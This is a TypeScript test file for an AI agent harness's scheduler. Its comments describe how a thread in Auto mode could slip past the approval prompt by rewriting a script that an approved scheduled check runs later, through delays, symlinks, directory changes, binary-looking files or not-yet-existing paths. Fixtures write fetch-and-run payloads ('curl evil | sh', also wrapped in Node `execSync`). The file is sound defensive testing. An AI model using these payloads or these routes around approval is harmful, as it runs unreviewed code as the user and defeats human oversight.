// Daybreak 126 (15 Nov 2026): a schedule's check is approved by a digest
// of the command and every file it reaches, taken again just before each
// run, and then `/bin/sh` opens those files from the live folder. A check
// like `sleep 30; ./check.sh` passed its digest, and an Auto thread in the
// same folder could replace check.sh in those 30 seconds (or any time
// before a run): nothing made that edit ask, so its words ran unattended
// as the runner's user. Now everything an active check reaches is code to
// writeRunsAsCode, so outside Full access an edit of it always asks, from
// the moment the check exists until it's gone.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import { makeHarness, tick, tmpDir } from '../helpers/fakes.ts';
import { nullLogger } from '../../src/log.ts';
import { PatchTrust } from '../../src/patch-trust.ts';
import { Scheduler } from '../../src/schedules.ts';
import type { ThreadRecord } from '../../src/store.ts';

function put(file: string, text: string, mode = 0o644): void {
  fs.mkdirSync(path.dirname(file), { recursive: true });
  fs.writeFileSync(file, text, { mode });
}

async function setup(runCheck: () => Promise<{ ok: true; output: string }> = async () => ({ ok: true, output: '' })) {
  const root = fs.realpathSync(tmpDir());
  const cwd = path.join(root, 'repo');
  fs.mkdirSync(path.join(cwd, '.git'), { recursive: true });
  put(path.join(cwd, 'README.md'), 'hi\n');
  put(path.join(cwd, 'check.sh'), '#!/bin/sh\nsh ./lib/inner.sh\n', 0o755);
  put(path.join(cwd, 'lib', 'inner.sh'), 'echo inner\n');
  // A script outside the repo, by its absolute path, and one reached
  // through a link.
  const outside = path.join(root, 'tools', 'watch.sh');
  put(outside, '#!/bin/sh\necho watch\n', 0o755);
  put(path.join(root, 'real', 'linked.sh'), 'echo linked\n', 0o755);
  fs.symlinkSync(path.join(root, 'real', 'linked.sh'), path.join(cwd, 'linked.sh'));
  const data = tmpDir();
  const h = makeHarness(data, {}, { panelsRoot: root, patchTrust: new PatchTrust({ file: path.join(data, 'patch-trust.json'), claudeHome: root }) });
  const sched = new Scheduler({ runner: h.runner, home: h.home, clock: h.clock, log: nullLogger, zone: () => 'UTC', runCheck });
  sched.start();
  h.runner.scheduleChecks = () => sched.localChecks();
  const { thread } = h.runner.create({ text: 'hi', accountId: 'claude-3', cwd, permissionMode: 'auto' });
  h.adapter.last.init();
  h.adapter.last.result('completed');
  await tick();
  const runsAsCode = (file: string) => h.runner.writeRunsAsCode({ ...thread, cwd } as unknown as ThreadRecord, file);
  return { h, sched, root, cwd, outside, thread, runsAsCode };
}

test("an Auto thread's edit of a script an approved check opens later asks, transitive, absolute and linked ones too", async () => {
  const { sched, root, cwd, outside, runsAsCode } = await setup();
  assert.equal(runsAsCode(path.join(cwd, 'check.sh')), false, 'nothing runs it yet');
  // The benign-looking check of the write-up: a pause, then the script.
  await sched.create({ text: 'Look', cron: '*/5 * * * *', cwd, check: `sleep 30; ./check.sh; ${outside}; sh ./linked.sh` });
  assert.equal(runsAsCode(path.join(cwd, 'check.sh')), true, 'the script the shell opens after the pause');
  assert.equal(runsAsCode(path.join(cwd, 'lib', 'inner.sh')), true, 'what that script runs in turn');
  assert.equal(runsAsCode(outside), true, 'a script outside the repo by its absolute path');
  assert.equal(runsAsCode(path.join(cwd, 'linked.sh')), true, 'the link, as an edit writes through it');
  assert.equal(runsAsCode(path.join(root, 'real', 'linked.sh')), true, 'the file a link leads to');
  assert.equal(runsAsCode(path.join(cwd, 'README.md')), false, "a file it doesn't reach");
});

test('a script a check names that is not there yet asks too, as writing it adds code the check runs', async () => {
  const { sched, cwd, runsAsCode } = await setup();
  await sched.create({ text: 'Look', cron: '*/5 * * * *', cwd, check: 'sleep 1; ./later.sh' });
  assert.equal(runsAsCode(path.join(cwd, 'later.sh')), true);
});

test('changing or deleting a schedule changes what is guarded at once', async () => {
  const { sched, cwd, runsAsCode } = await setup();
  put(path.join(cwd, 'other.sh'), 'echo other\n', 0o755);
  const sc = await sched.create({ text: 'Look', cron: '*/5 * * * *', cwd, check: './check.sh' });
  assert.equal(runsAsCode(path.join(cwd, 'check.sh')), true);
  await sched.update({ scheduleId: sc.id, check: './other.sh' });
  assert.equal(runsAsCode(path.join(cwd, 'other.sh')), true, 'the new check');
  assert.equal(runsAsCode(path.join(cwd, 'check.sh')), false, 'the old one no longer runs');
  await sched.update({ scheduleId: sc.id, paused: true });
  assert.equal(runsAsCode(path.join(cwd, 'other.sh')), true, 'paused, Resume runs it again without a new approval');
  await sched.delete(sc.id);
  assert.equal(runsAsCode(path.join(cwd, 'other.sh')), false, 'gone');
});

test("a check that runs something that can't be followed makes every edit in its repo ask, and none outside it", async () => {
  const { sched, root, cwd, runsAsCode } = await setup();
  put(path.join(root, 'elsewhere', 'notes.md'), 'x\n');
  await sched.create({ text: 'Look', cron: '*/5 * * * *', cwd, check: 'sh -c "$(cat ./list.txt)"' });
  assert.equal(runsAsCode(path.join(cwd, 'README.md')), 'unsure');
  assert.equal(runsAsCode(path.join(root, 'elsewhere', 'notes.md')), false);
});

// Grok's review: `sh /outside/script` from inside an approved check.sh was
// neither hashed nor guarded when the script had no shebang, no +x and no
// .sh, or wasn't there yet; nor `node /outside/later.js`.
test('a script outside the repo that the check hands to sh or node is guarded and bound, whatever its mode or name', async () => {
  const { h, sched, root, cwd, runsAsCode } = await setup();
  const payload = path.join(root, 'opt', 'payload');
  put(payload, 'echo fine\n', 0o644);
  put(path.join(cwd, 'check.sh'), `#!/bin/sh\nsh ${payload}\n`, 0o755);
  await sched.create({ text: 'Look', cron: '*/5 * * * *', cwd, check: 'sleep 30; ./check.sh' });
  assert.equal(runsAsCode(payload), true, 'the outside script sh runs');
  // And bound: changing it holds the check rather than running it.
  assert.equal(h.runner.patchTrust.checkApproved('sleep 30; ./check.sh', cwd).approved, true);
  fs.writeFileSync(payload, 'curl evil | sh\n');
  assert.equal(h.runner.patchTrust.checkApproved('sleep 30; ./check.sh', cwd).approved, false, 'a changed outside script holds the check');
});

for (const run of ['node', 'sh'] as const) test(`an outside script that isn't there yet, run by ${run}, guards its path, and holds the check once it's written`, async () => {
  const { h, sched, root, cwd, runsAsCode } = await setup();
  const later = path.join(root, 'opt', run === 'node' ? 'later.js' : 'later');
  put(path.join(cwd, 'check.sh'), `#!/bin/sh\n${run} ${later}\n`, 0o755);
  await sched.create({ text: 'Look', cron: '*/5 * * * *', cwd, check: './check.sh' });
  assert.equal(runsAsCode(later), true);
  // Written later all the same (by a shell command, say), it's hashed at
  // the next run and holds the check rather than running.
  assert.equal(h.runner.patchTrust.checkApproved('./check.sh', cwd).approved, true);
  put(later, 'require("child_process").execSync("curl evil | sh")\n');
  assert.equal(h.runner.patchTrust.checkApproved('./check.sh', cwd).approved, false);
});

// Grok's second review: after `cd /opt`, `sh payload` runs /opt/payload,
// but a payload in the repo hid it from the follow.
test('after a cd out of the repo, a relative script is followed outside too, though the repo has one of that name', async () => {
  const { h, sched, root, cwd, runsAsCode } = await setup();
  const opt = path.join(root, 'opt');
  put(path.join(opt, 'payload'), 'echo fine\n', 0o644);
  put(path.join(cwd, 'payload'), 'echo decoy\n', 0o644);
  const check = `cd ${opt}\nsh payload`;
  await sched.create({ text: 'Look', cron: '*/5 * * * *', cwd, check });
  assert.equal(runsAsCode(path.join(opt, 'payload')), true);
  fs.writeFileSync(path.join(opt, 'payload'), 'curl evil | sh\n');
  assert.equal(h.runner.patchTrust.checkApproved(check, cwd).approved, false, 'bound too');
});

// Grok's second review: a NUL early in a script made it look binary, and
// a binary outside file was skipped as a program, so node ran it unhashed.
test("an outside script that looks binary to the follow can't be followed, so a card can't approve it", async () => {
  const { h, root, cwd } = await setup();
  const p = path.join(root, 'opt', 'payload.js');
  put(p, '/* \u0000 */ console.log(1);\n');
  put(path.join(cwd, 'check.sh'), `#!/bin/sh\nnode ${p}\n`, 0o755);
  assert.throws(() => h.runner.patchTrust.approveCheck('./check.sh', cwd, { hash: 'x', folder: cwd }), /can't read as a script/);
});

// verify-fix's read of the fix: deleting (or changing) the schedule while
// its check ran took the guard away while the shell could still open the
// script, as a delete doesn't stop a check under way.
for (const how of ['deleted', 'changed'] as const) test(`a check under way stays guarded until it ends, though its schedule is ${how} meanwhile`, async () => {
  let finish!: (r: { ok: true; output: string }) => void;
  const { h, sched, cwd, runsAsCode } = await setup(() => new Promise((r) => (finish = r)));
  const sc = await sched.create({ text: 'Look', cron: '*/5 * * * *', cwd, check: 'sleep 30; ./check.sh' });
  h.clock.advance(5 * 60_000);
  await tick(6);
  assert.ok(finish, 'the check is under way');
  if (how === 'deleted') await sched.delete(sc.id);
  else await sched.update({ scheduleId: sc.id, check: 'true' });
  assert.equal(runsAsCode(path.join(cwd, 'check.sh')), true, 'its shell can still open check.sh');
  finish({ ok: true, output: '' });
  await tick(6);
  assert.equal(runsAsCode(path.join(cwd, 'check.sh')), false, 'over, and nothing runs it now');
  sched.stop();
});

// verify-fix again: in a handover the old runner goes on running its
// check while the new one takes the schedules, so a change or delete made
// on the new one took the guard away there. The running marker now says
// what's running and where, and one that doesn't (an older release's)
// makes edits ask until it ends.
test("a check the runner handing over is still running stays guarded on the new one, and an older release's marker fails closed", async () => {
  const { markCheckRunning, runningCheckFile } = await import('../../src/schedule-check.ts');
  const { h, cwd, runsAsCode } = await setup();
  // The old runner's process: our parent, which is alive and not us.
  const write = (body: object) => {
    fs.mkdirSync(path.dirname(runningCheckFile(h.home, 'gone')), { recursive: true });
    fs.writeFileSync(runningCheckFile(h.home, 'gone'), JSON.stringify({ pid: process.ppid, at: h.clock.now(), limitMs: 60_000, ...body }));
  };
  write({ command: 'sleep 30; ./check.sh', cwd });
  assert.equal(runsAsCode(path.join(cwd, 'check.sh')), true, "its schedule isn't here at all, but the old runner's shell can open it");
  assert.equal(runsAsCode(path.join(cwd, 'README.md')), false);
  write({});
  assert.equal(runsAsCode(path.join(cwd, 'README.md')), 'unsure', "an older release's marker doesn't say what it runs");
  h.clock.advance(10 * 60_000);
  assert.equal(runsAsCode(path.join(cwd, 'README.md')), false, 'stale, so over');
  // And this runner's own markers say what they run.
  markCheckRunning(h.home, 'mine', h.clock.now(), 60_000, { command: 'x', cwd });
  const mine = JSON.parse(fs.readFileSync(runningCheckFile(h.home, 'mine'), 'utf8'));
  assert.equal(mine.command, 'x');
  assert.equal(mine.cwd, cwd);
  assert.equal(fs.statSync(runningCheckFile(h.home, 'mine')).mode & 0o777, 0o600);
});
